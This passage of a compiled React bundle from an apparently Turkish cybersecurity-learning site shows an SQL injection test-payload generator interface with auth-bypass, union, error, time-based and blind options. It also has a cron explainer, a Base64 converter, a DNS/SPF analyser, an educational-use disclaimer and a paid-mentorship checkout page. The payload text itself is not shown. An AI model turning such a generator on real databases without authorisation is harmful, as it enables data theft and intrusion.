onChange: (e) => setSqliType(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm" }, /* @__PURE__ */ React.createElement("option", { value: "auth" }, "Kimlik Do\u011Frulama Bypass (Auth Bypass)"), /* @__PURE__ */ React.createElement("option", { value: "union" }, "Birlik Tabanl\u0131 (Union Based)"), /* @__PURE__ */ React.createElement("option", { value: "error" }, "Hata Tabanl\u0131 (Error Based)"), /* @__PURE__ */ React.createElement("option", { value: "time" }, "Zaman Tabanl\u0131 (Time Based / Blind)"), /* @__PURE__ */ React.createElement("option", { value: "blind" }, "Boolean K\xF6r Enjeksiyon (Blind Boolean)")))), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-3 gap-4 mb-6" }, sqliType === "union" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "S\xFCtun Say\u0131s\u0131"), /* @__PURE__ */ React.createElement("input", { type: "number", value: sqliCols, onChange: (e) => setSqliCols(Math.max(1, parseInt(e.target.value) || 1)), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm", min: "1", max: "100" })), (sqliType === "union" || sqliType === "error" || sqliType === "blind") && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Sorgulanacak Bilgi / Fonksiyon"), /* @__PURE__ */ React.createElement("input", { value: sqliDbName, onChange: (e) => setSqliDbName(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "database()" })), sqliType === "union" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Hedef Tablo (Opsiyonel)"), /* @__PURE__ */ React.createElement("input", { value: sqliTable, onChange: (e) => setSqliTable(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "users" }))), /* @__PURE__ */ React.createElement("div", { className: "relative mb-6" }, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between text-xs font-mono uppercase text-[#5c8a74] mb-2" }, /* @__PURE__ */ React.createElement("span", null, "SQL Injection Test Payload"), /* @__PURE__ */ React.createElement("span", null, getSqliPayload().length, " karakter")), /* @__PURE__ */ React.createElement("div", { className: "absolute right-3 top-8 z-10" }, /* @__PURE__ */ React.createElement("button", { onClick: () => handleCopy(getSqliPayload(), "sqli"), className: "px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors" }, copied === "sqli" ? "\u2713 Kopyaland\u0131!" : "\u{1F4CB} Kopyala")), /* @__PURE__ */ React.createElement("pre", { className: "bg-[#020806] border border-[#103a26] rounded-xl p-5 pt-12 overflow-x-auto text-sm text-[#eafff5] font-mono whitespace-pre-wrap break-all min-h-[100px]" }, getSqliPayload())), /* @__PURE__ */ React.createElement("div", { className: "rounded-xl border border-[#103a26] p-4 bg-[rgba(0,255,136,.02)] text-xs text-[#74998a] space-y-2 leading-relaxed" }, /* @__PURE__ */ React.createElement("div", { className: "font-bold text-[#00ff88]" }, "\u{1F4A1} E\u011Fitim Notu:"), /* @__PURE__ */ React.createElement("div", null, "SQL Injection (SQLi), veri taban\u0131na g\xF6nderilen sorgulara d\u0131\u015Far\u0131dan m\xFCdahale edilerek yetkisiz veri okuma, yazma veya sunucu \xFCzerinde komut \xE7al\u0131\u015Ft\u0131rma zafiyetidir. G\xFCvenli kod yaz\u0131m\u0131nda parametrik sorgular (Prepared Statements) kullan\u0131larak \xF6nlenir."))), slug === "cron-explainer" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl font-bold text-[#eafff5] mb-2" }, "\u23F0 Cron Zamanlay\u0131c\u0131 & A\xE7\u0131klay\u0131c\u0131"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "Cron ifadelerini T\xFCrk\xE7e do\u011Fal dilde analiz edin veya g\xF6rsel se\xE7iciler yard\u0131m\u0131yla s\u0131f\u0131rdan cron zamanlamalar\u0131 tasarlay\u0131n."), /* @__PURE__ */ React.createElement("div", { className: "flex gap-2 mb-6" }, /* @__PURE__ */ React.createElement("button", { onClick: () => setCronInputMode("interactive"), className: `px-4 py-2 border font-mono text-xs rounded-lg transition-colors ${cronInputMode === "interactive" ? "bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]" : "border-[#103a26] text-[#74998a] hover:text-[#cdeede]"}` }, "G\xF6rsel Olu\u015Fturucu"), /* @__PURE__ */ React.createElement("button", { onClick: () => setCronInputMode("manual"), className: `px-4 py-2 border font-mono text-xs rounded-lg transition-colors ${cronInputMode === "manual" ? "bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]" : "border-[#103a26] text-[#74998a] hover:text-[#cdeede]"}` }, "Manuel \u0130fade Giri\u015Fi")), cronInputMode === "interactive" ? /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-2 sm:grid-cols-5 gap-4 mb-6" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs font-mono uppercase text-[#5c8a74] mb-2" }, "Dakika"), /* @__PURE__ */ React.createElement("select", { value: cronMin, onChange: (e) => setCronMin(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-3 py-2 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-xs" }, /* @__PURE__ */ React.createElement("option", { value: "*" }, "Her Dakika (*)"), /* @__PURE__ */ React.createElement("option", { value: "*/5" }, "5 Dk'da Bir (*/5)"), /* @__PURE__ */ React.createElement("option", { value: "*/15" }, "15 Dk'da Bir (*/15)"), /* @__PURE__ */ React.createElement("option", { value: "0" }, "Saat Ba\u015F\u0131nda (0)"), /* @__PURE__ */ React.createElement("option", { value: "30" }, "Yar\u0131m Saatte (30)"))), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs font-mono uppercase text-[#5c8a74] mb-2" }, "Saat"), /* @__PURE__ */ React.createElement("select", { value: cronHour, onChange: (e) => setCronHour(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-3 py-2 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-xs" }, /* @__PURE__ */ React.createElement("option", { value: "*" }, "Her Saat (*)"), /* @__PURE__ */ React.createElement("option", { value: "*/2" }, "2 Saatte Bir (*/2)"), /* @__PURE__ */ React.createElement("option", { value: "12" }, "\xD6\u011Flen 12'de (12)"), /* @__PURE__ */ React.createElement("option", { value: "0" }, "Gece 00'da (0)"), /* @__PURE__ */ React.createElement("option", { value: "9-17" }, "Mesai Saatleri (9-17)"))), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs font-mono uppercase text-[#5c8a74] mb-2" }, "G\xFCn (Ay\u0131n)"), /* @__PURE__ */ React.createElement("select", { value: cronDay, onChange: (e) => setCronDay(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-3 py-2 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-xs" }, /* @__PURE__ */ React.createElement("option", { value: "*" }, "Her G\xFCn (*)"), /* @__PURE__ */ React.createElement("option", { value: "1" }, "Ay\u0131n 1. G\xFCn\xFC (1)"), /* @__PURE__ */ React.createElement("option", { value: "15" }, "Ay\u0131n 15. G\xFCn\xFC (15)"), /* @__PURE__ */ React.createElement("option", { value: "1-15" }, "Ay\u0131n \u0130lk Yar\u0131s\u0131 (1-15)"))), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs font-mono uppercase text-[#5c8a74] mb-2" }, "Ay"), /* @__PURE__ */ React.createElement("select", { value: cronMonth, onChange: (e) => setCronMonth(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-3 py-2 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-xs" }, /* @__PURE__ */ React.createElement("option", { value: "*" }, "Her Ay (*)"), /* @__PURE__ */ React.createElement("option", { value: "*/3" }, "3 Ayda Bir (*/3)"), /* @__PURE__ */ React.createElement("option", { value: "1" }, "Ocak (1)"), /* @__PURE__ */ React.createElement("option", { value: "6" }, "Haziran (6)"))), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-xs font-mono uppercase text-[#5c8a74] mb-2" }, "G\xFCn (Haftan\u0131n)"), /* @__PURE__ */ React.createElement("select", { value: cronDow, onChange: (e) => setCronDow(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-3 py-2 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-xs" }, /* @__PURE__ */ React.createElement("option", { value: "*" }, "Her G\xFCn (*)"), /* @__PURE__ */ React.createElement("option", { value: "1-5" }, "Hafta \u0130\xE7i (1-5)"), /* @__PURE__ */ React.createElement("option", { value: "0,6" }, "Hafta Sonu (0,6)"), /* @__PURE__ */ React.createElement("option", { value: "1" }, "Pazartesi (1)"), /* @__PURE__ */ React.createElement("option", { value: "5" }, "Cuma (5)")))) : /* @__PURE__ */ React.createElement("div", { className: "mb-6" }, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Cron \u0130fadesi (5 S\xFCtunlu)"), /* @__PURE__ */ React.createElement("input", { value: cronManualInput, onChange: (e) => setCronManualInput(e.target.value), className: "w-full bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#00ff88] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "*/5 * * * *" })), /* @__PURE__ */ React.createElement("div", { className: "border border-[#0c2719] bg-[#020806] rounded-xl p-5 mb-6 font-mono" }, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between items-center border-b border-[#0c2719] pb-3 mb-3" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("span", { className: "text-[10px] text-[#74998a] uppercase tracking-wider block" }, "Cron Zamanlama \u0130fadesi"), /* @__PURE__ */ React.createElement("span", { className: "text-lg font-bold text-[#eafff5]" }, cronManualInput)), /* @__PURE__ */ React.createElement("button", { onClick: () => handleCopy(cronManualInput, "cron"), className: "px-2.5 py-1.5 bg-black border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs transition-colors" }, copied === "cron" ? "\u2713 Kopyaland\u0131!" : "\u{1F4CB} Kopyala")), /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("span", { className: "text-[10px] text-[#74998a] uppercase tracking-wider block mb-1" }, "T\xFCrk\xE7e Do\u011Fal Dil A\xE7\u0131klamas\u0131"), /* @__PURE__ */ React.createElement("p", { className: "text-sm text-[#00ff88] leading-relaxed" }, explainCron(cronManualInput)))), /* @__PURE__ */ React.createElement("div", { className: "border border-[#103a26] bg-black/40 rounded-xl p-5 font-mono text-xs space-y-3" }, /* @__PURE__ */ React.createElement("h3", { className: "text-sm font-bold text-[#eafff5] mb-2" }, "Cron Yap\u0131s\u0131 K\u0131lavuzu"), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-[100px_1fr] gap-2" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88] font-bold" }, "* * * * *"), /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, "S\u0131ras\u0131yla: Dakika Saat G\xFCn Ay Haftan\u0131n_G\xFCn\xFC")), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-[100px_1fr] gap-2 border-t border-[#0c2719]/40 pt-2" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#cdeede]" }, "/ Karakteri:"), /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, "Ad\u0131mlar\u0131 veya s\u0131kl\u0131\u011F\u0131 belirtir (\xD6rn: */15 = her 15 dakikada bir)")), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-[100px_1fr] gap-2 border-t border-[#0c2719]/40 pt-2" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#cdeede]" }, "- Karakteri:"), /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, "Aral\u0131klar\u0131 belirtir (\xD6rn: 9-17 = saat 9 ile 17 aras\u0131 her saat)")), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-[100px_1fr] gap-2 border-t border-[#0c2719]/40 pt-2" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#cdeede]" }, ", Karakteri:"), /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, "Liste de\u011Ferleri ay\u0131r\u0131r (\xD6rn: 1,3,5 = sadece Pazartesi, \xC7ar\u015Famba ve Cuma)")))), slug === "base64-file" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl font-bold text-[#eafff5] mb-2" }, "\u{1F4C1} Base64 Dosya D\xF6n\xFC\u015Ft\xFCr\xFCc\xFC"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "Dosyalar\u0131n\u0131z\u0131 ve g\xF6rsellerinizi yerel olarak Base64 metin koduna \xE7evirin veya Base64 kodlar\u0131n\u0131 tekrar orijinal dosyaya d\xF6n\xFC\u015Ft\xFCrerek indirin."), /* @__PURE__ */ React.createElement("div", { className: "flex gap-2 mb-6" }, /* @__PURE__ */ React.createElement("button", { onClick: () => setB64ToolMode("encode"), className: `px-4 py-2 border font-mono text-xs rounded-lg transition-colors ${b64ToolMode === "encode" ? "bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]" : "border-[#103a26] text-[#74998a] hover:text-[#cdeede]"}` }, "Dosyay\u0131 Base64'e \xC7evir"), /* @__PURE__ */ React.createElement("button", { onClick: () => setB64ToolMode("decode"), className: `px-4 py-2 border font-mono text-xs rounded-lg transition-colors ${b64ToolMode === "decode" ? "bg-[rgba(0,255,136,.1)] border-[#00ff88] text-[#00ff88]" : "border-[#103a26] text-[#74998a] hover:text-[#cdeede]"}` }, "Base64'\xFC Dosyaya \xC7evir")), b64ToolMode === "encode" ? /* @__PURE__ */ React.createElement("div", { className: "space-y-6" }, /* @__PURE__ */ React.createElement("div", { className: "border-2 border-dashed border-[#103a26] hover:border-[#00ff88] rounded-xl p-8 text-center bg-[#020806]/40 cursor-pointer relative group transition-colors" }, /* @__PURE__ */ React.createElement("input", { type: "file", onChange: handleFileSelect, className: "absolute inset-0 w-full h-full opacity-0 cursor-pointer" }), /* @__PURE__ */ React.createElement("div", { className: "text-3xl mb-3" }, "\u{1F4E4}"), /* @__PURE__ */ React.createElement("p", { className: "text-[#eafff5] font-mono text-sm font-bold mb-1" }, "Dosya Se\xE7in veya S\xFCr\xFCkleyin"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-xs" }, "Maksimum \xF6nerilen dosya boyutu: 10MB")), b64FileName && /* @__PURE__ */ React.createElement("div", { className: "border border-[#0c2719] bg-[#020806] rounded-xl p-4 font-mono text-xs space-y-2" }, /* @__PURE__ */ React.createElement("div", { className: "text-[#5c8a74] border-b border-[#0c2719] pb-1.5 uppercase font-bold" }, "Dosya Bilgileri"), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, "Dosya Ad\u0131:"), /* @__PURE__ */ React.createElement("span", { className: "text-[#eafff5] font-bold" }, b64FileName)), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, "Dosya Boyutu:"), /* @__PURE__ */ React.createElement("span", { className: "text-[#eafff5] font-bold" }, (b64FileSize / 1024).toFixed(2), " KB")), /* @__PURE__ */ React.createElement("div", { className: "flex justify-between" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, "MIME T\xFCr\xFC:"), /* @__PURE__ */ React.createElement("span", { className: "text-[#eafff5] font-bold" }, b64FileType || "Bilinmiyor"))), b64Encoded && /* @__PURE__ */ React.createElement("div", { className: "relative" }, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between text-xs font-mono uppercase text-[#5c8a74] mb-2" }, /* @__PURE__ */ React.createElement("span", null, "Base64 Veri \xC7\u0131kt\u0131s\u0131 (Data URL)"), /* @__PURE__ */ React.createElement("span", null, b64Encoded.length, " karakter")), /* @__PURE__ */ React.createElement("div", { className: "absolute right-3 top-8 z-10" }, /* @__PURE__ */ React.createElement("button", { onClick: () => handleCopy(b64Encoded, "b64enc"), className: "px-2.5 py-1.5 bg-[#020806] border border-[#103a26] text-[#00ff88] hover:border-[#00ff88] rounded text-xs font-mono transition-colors" }, copied === "b64enc" ? "\u2713 Kopyaland\u0131!" : "\u{1F4CB} Kopyala")), /* @__PURE__ */ React.createElement("textarea", { readOnly: true, value: b64Encoded, rows: "8", className: "w-full bg-[#020806] border border-[#103a26] rounded-xl p-4 pt-12 text-[#00ff88] focus:outline-none font-mono text-xs resize-none", placeholder: "Base64 \xE7\u0131kt\u0131s\u0131\u2026" }))) : /* @__PURE__ */ React.createElement("div", { className: "space-y-6" }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("label", { className: "block text-sm text-[#cdeede] mb-2 font-mono" }, "Base64 Metin Verisi (Data URL veya D\xFCz Metin)"), /* @__PURE__ */ React.createElement("textarea", { value: b64DecodeText, onChange: (e) => setB64DecodeText(e.target.value), rows: "8", className: "w-full bg-[#020806] border border-[#103a26] rounded-xl p-4 text-[#cdeede] placeholder-[#3d564b] focus:border-[#00ff88] focus:outline-none font-mono text-xs resize-none", placeholder: "Buraya Base64 kodunu girin (\xD6rn: data:image/png;base64,iVBOR...) veya d\xFCz base64 dizesini yap\u0131\u015Ft\u0131r\u0131n\u2026" })), /* @__PURE__ */ React.createElement("button", { onClick: handleBase64Decode, className: "w-full py-3 font-mono font-bold text-[#021008] bg-[#00ff88] rounded-lg hover:shadow-[0_0_20px_-4px_var(--glow)] transition-all" }, "Dosyay\u0131 \xC7\xF6z ve \u0130ndir \u{1F4E5}"))), slug === "dns-lookup" && /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("h1", { className: "text-2xl font-bold text-[#eafff5] mb-2" }, "\u{1F4E1} DNS & SPF DMARC Analiz\xF6r\xFC"), /* @__PURE__ */ React.createElement("p", { className: "text-[#74998a] text-sm mb-6" }, "Herhangi bir alan ad\u0131n\u0131n DNS (A, MX, TXT) kay\u0131tlar\u0131n\u0131 sorgulay\u0131n ve e-posta sahtecili\u011Fi korumalar\u0131n\u0131 (SPF, DMARC) test edin."), /* @__PURE__ */ React.createElement("div", { className: "flex gap-2 mb-6" }, /* @__PURE__ */ React.createElement("input", { value: dnsDomain, onChange: (e) => setDnsDomain(e.target.value), className: "flex-1 bg-[#020806] border border-[#103a26] rounded-lg px-4 py-2.5 text-[#cdeede] focus:border-[#00ff88] focus:outline-none font-mono text-sm", placeholder: "alanadi.com" }), /* @__PURE__ */ React.createElement("button", { onClick: runDnsQuery, disabled: dnsLoading, className: "px-6 py-2.5 font-mono font-bold text-[#021008] bg-[#00ff88] hover:bg-[#5cffba] disabled:bg-[#3d564b] disabled:text-[#74998a] rounded-lg transition-colors flex items-center gap-2" }, dnsLoading ? /* @__PURE__ */ React.createElement(React.Fragment, null, /* @__PURE__ */ React.createElement("span", { className: "w-4 h-4 border-2 border-black border-t-transparent rounded-full animate-spin" }), "Sorgulan\u0131yor...") : "Sorgula \u{1F50D}")), dnsResults && /* @__PURE__ */ React.createElement("div", { className: "space-y-6" }, /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-4" }, dnsResults.risks.map((risk, idx) => /* @__PURE__ */ React.createElement("div", { key: idx, className: `border rounded-xl p-4 font-mono flex flex-col justify-between ${risk.color}` }, /* @__PURE__ */ React.createElement("div", null, /* @__PURE__ */ React.createElement("div", { className: "flex justify-between items-center mb-2" }, /* @__PURE__ */ React.createElement("span", { className: "text-[10px] uppercase tracking-wider opacity-80" }, "G\xFCvenlik Durumu"), /* @__PURE__ */ React.createElement("span", { className: "text-xs font-bold uppercase" }, risk.status)), /* @__PURE__ */ React.createElement("h4", { className: "text-sm font-bold text-[#eafff5] mb-1" }, risk.title), /* @__PURE__ */ React.createElement("p", { className: "text-xs opacity-90 leading-relaxed" }, risk.desc))))), /* @__PURE__ */ React.createElement("div", { className: "grid grid-cols-1 md:grid-cols-2 gap-6" }, /* @__PURE__ */ React.createElement("div", { className: "border border-[#103a26] bg-[#020806] rounded-xl p-5" }, /* @__PURE__ */ React.createElement("h3", { className: "text-sm font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2" }, "A Kay\u0131tlar\u0131 (IP Adresleri)"), dnsResults.a && dnsResults.a.length > 0 ? /* @__PURE__ */ React.createElement("div", { className: "space-y-2 font-mono text-xs" }, dnsResults.a.map((rec, idx) => /* @__PURE__ */ React.createElement("div", { key: idx, className: "flex justify-between border-b border-[#0c2719]/40 pb-1.5" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a]" }, rec.name), /* @__PURE__ */ React.createElement("span", { className: "text-[#00ff88] font-bold select-all" }, rec.data)))) : /* @__PURE__ */ React.createElement("div", { className: "text-center py-6 text-xs text-[#74998a] font-mono" }, "A kayd\u0131 bulunamad\u0131.")), /* @__PURE__ */ React.createElement("div", { className: "border border-[#103a26] bg-[#020806] rounded-xl p-5" }, /* @__PURE__ */ React.createElement("h3", { className: "text-sm font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2" }, "MX Kay\u0131tlar\u0131 (Mail Sunucular\u0131)"), dnsResults.mx && dnsResults.mx.length > 0 ? /* @__PURE__ */ React.createElement("div", { className: "space-y-2 font-mono text-xs" }, dnsResults.mx.map((rec, idx) => /* @__PURE__ */ React.createElement("div", { key: idx, className: "flex justify-between border-b border-[#0c2719]/40 pb-1.5" }, /* @__PURE__ */ React.createElement("span", { className: "text-[#74998a] truncate pr-4" }, rec.name), /* @__PURE__ */ React.createElement("span", { className: "text-[#cdeede] font-bold select-all" }, rec.data)))) : /* @__PURE__ */ React.createElement("div", { className: "text-center py-6 text-xs text-[#74998a] font-mono" }, "MX kayd\u0131 bulunamad\u0131."))), /* @__PURE__ */ React.createElement("div", { className: "border border-[#103a26] bg-[#020806] rounded-xl p-5" }, /* @__PURE__ */ React.createElement("h3", { className: "text-sm font-bold text-[#eafff5] mb-4 border-b border-[#0c2719] pb-2" }, "T\xFCm TXT Kay\u0131tlar\u0131"), dnsResults.txt && dnsResults.txt.length > 0 ? /* @__PURE__ */ React.createElement("div", { className: "space-y-3 font-mono text-xs" }, dnsResults.txt.map((rec, idx) => /* @__PURE__ */ React.createElement("div", { key: idx, className: "border-b border-[#0c2719]/40 pb-2 last:border-0 last:pb-0" }, /* @__PURE__ */ React.createElement("div", { className: "text-[10px] text-[#74998a] mb-1" }, rec.name), /* @__PURE__ */ React.createElement("div", { className: "text-[#cdeede] select-all break-all" }, rec.data)))) : /* @__PURE__ */ React.createElement("div", { className: "text-center py-6 text-xs text-[#74998a] font-mono" }, "TXT kayd\u0131 bulunamad\u0131.")))))), /* @__PURE__ */ React.createElement("div", { className: "mt-8 rounded-xl border border-yellow-500/20 bg-[rgba(234,179,8,.02)] p-4 text-xs font-mono text-yellow-500/80 leading-relaxed" }, /* @__PURE__ */ React.createElement("strong", null, "\u26A0\uFE0F YASAL UYARI & SORUMLULUK REDD\u0130:"), " Bu platformda sunulan t\xFCm siber g\xFCvenlik ara\xE7lar\u0131; yaln\u0131zca e\u011Fitim, siber g\xFCvenlik fark\u0131ndal\u0131\u011F\u0131 olu\u015Fturma ve yetkili s\u0131zma testi (penetrasyon) \xE7al\u0131\u015Fmalar\u0131 amac\u0131yla geli\u015Ftirilmi\u015Ftir. Bu ara\xE7lar\u0131n izinsiz veya yasa d\u0131\u015F\u0131 sistemlerde kullan\u0131lmas\u0131ndan do\u011Fabilecek t\xFCm cezai ve hukuki sorumluluk tamamen kullan\u0131c\u0131ya aittir. ", /* @__PURE__ */ React.createElement("code", null, "siberkampus.com"), " hi\xE7bir k\xF6t\xFC niyetli kullan\u0131mda sorumluluk kabul etmez.")))
    ));
  };
  var PricingPage = ({ navigate }) => {
    const HeaderCmp = window.SKHeader || (() => null);
    const FooterCmp = window.SKFooter || (() => null);
    const useUser2 = window.SKuseUser || (() => [null]);
    const [user] = useUser2();
    const isLoggedIn = !!localStorage.getItem("sk_token");
    const [showCheckout, setShowCheckout] = useState(null);
    const [checkoutStep, setCheckoutStep] = useState(1);
    const [showLegal, setShowLegal] = useState(null);
    const [agreed, setAgreed] = useState({ mesafeli: false, onbilgi: false, iade: false });
    const [checkoutEmail, setCheckoutEmail] = useState("");
    const [checkoutName, setCheckoutName] = useState("");
    const [paytrToken, setPaytrToken] = useState(null);
    const [merchantOid, setMerchantOid] = useState(null);
    const [loading, setLoading] = useState(false);
    const [checkoutError, setCheckoutError] = useState("");
    const plans = [
      {
        id: "free-basic",
        name: "15 Dk. \xDCcretsiz \xD6n G\xF6r\xFC\u015Fme",
        tag: "TANI\u015EMA",
        price: 0,
        oldPrice: null,
        period: null,
        img: "/freeeducationiamge-fiyatland\u0131rma.jpg",
        features: [
          "Bire Bir Tan\u0131\u015Fma G\xF6r\xFC\u015Fmesi",
          "Algoritma & Seviye Tespiti",
          "\xDCcretsiz Yol Haritas\u0131 Planlamas\u0131",
          "Mentorluk S\xFCreci Detaylar\u0131"
        ],
        cta: "\xDCcretsiz Randevu Al \u26A1",
        popular: false,
        accent: "#74998a"
      },
      {
        id: "web-pentest",
        name: "1'e 1 Canl\u0131 Ment\xF6rl\xFCk & Backend E\u011Fitimi",
        tag: "EN POP\xDCLER",
        price: 1500,
        oldPrice: 3e3,
        period: "Tek Ders (1 Saat)",
        img: "/mentoregitimi-fiyatland\u0131rma.jpg",
        features: [
          "1 Saat Bire Bir Canl\u0131 Geli\u015Ftirme Seans\u0131",
          "C# / .NET Core Hata \xC7\xF6z\xFCm\xFC & Dan\u0131\u015Fmanl\u0131k",
          "\xD6zel Kod \u0130ncelemesi (Code Review)",
          "Yusuf \u0130slam Yetkin ile Do\u011Frudan Ba\u011Flant\u0131"
        ],
        cta: "Sat\u0131n Al \u26A1",
        popular: true,
        accent: "#00ff88"
      },
      {
        id: "one-on-one",
        name: "\u0130leri D\xFCzey C# & .NET Core Backend Uzman\u0131 E\u011Fitimi",
        tag: "10 SAATL\u0130K PAKET",
        price: 2e4,
        oldPrice: 4e4,
        period: "10 Saatlik Paket",
        img: "/uzmanegitim-fiyatland\u0131rma.jpg",
        features: [
          "10 Saat Bire Bir Canl\u0131 Ment\xF6rl\xFCk & Kodlama",
          "Finans & Bankac\u0131l\u0131k Seviyesinde Backend Mimarisi",
          "Netflix & Uber D\xFCzeyinde Sistem Tasar\u0131m\u0131 (System Design)",
          "Mikroservisler, Event-Driven & Da\u011F\u0131t\u0131k Mimari",
          "Kubernetes, Docker, RabbitMQ & Redis Entegrasyonu",
          "CV Haz\u0131rlama, Teknik M\xFClakat Sim\xFClasyonu & \u0130\u015F Referans\u0131"
        ],
        cta: "Sat\u0131n Al \u26A1",
        popular: false,
        accent: "#ffd166"
      }
    ];
    const handlePlanClick = (plan) => {
      if (plan.id === "free-basic") {
        window.__SK_OPEN_QUIZ = true;
        navigate("home");
        return;
      }
      openCheckoutModal(plan);
    };
    const openCheckoutModal = (plan) => {
      setShowCheckout(plan);
      setCheckoutStep(1);
      setCheckoutError("");
      setPaytrToken(null);
      setMerchantOid(null);
      setAgreed({ mesafeli: false, onbilgi: false, iade: false });
      const u = window.__SK_USER;
      if (isLoggedIn && u && u.name !== "Misafir") {
        setCheckoutName(u.name || "");
        const storedEmail = localStorage.getItem("sk_user_email") || "";
        setCheckoutEmail(storedEmail);
      } else {
        setCheckoutName("");
        setCheckoutEmail("");
      }
    };
    const handleStartPayment = async () => {
      if (!agreed.mesafeli || !agreed.onbilgi || !agreed.iade) {
        setCheckoutError("L\xFCtfen t\xFCm s\xF6zle\u015Fmeleri onaylay\u0131n.");
        return;
      }
      if (!checkoutEmail || !checkoutName) {
        setCheckoutError("E-posta ve ad soyad zorunludur.");
        return;
      }
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      if (!emailRegex.test(checkoutEmail)) {
        setCheckoutError("Ge\xE7erli bir e-posta adresi girin.");
        return;
      }
      setCheckoutError("");
      setLoading(true);
      try {
        const res = await fetch("/api/checkout/start", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: checkoutEmail, name: checkoutName, plan_id: showCheckout.id })
        });
        const data = await res.json();
        if (data.status === "success" && data.token) {
          setPaytrToken(data.token);
          setMerchantOid(data.merchant_oid);
          setCheckoutStep(2);
        } else {
          setCheckoutError(data.error || "\xD6deme ba\u015Flat\u0131lamad\u0131. L\xFCtfen tekrar deneyin.");
        }
      } catch (err) {
        setCheckoutError("Ba\u011Flant\u0131 hatas\u0131. L\xFCtfen internet ba\u011Flant\u0131n\u0131z\u0131 kontrol edin.");
      } finally {
        setLoading(false);
      }
    };
    useEffect(() => {
      const params = new URLSearchParams(window.location.search);
      const payment = params.get("payment");
      if (payment === "success") {
        setCheckoutStep(3);
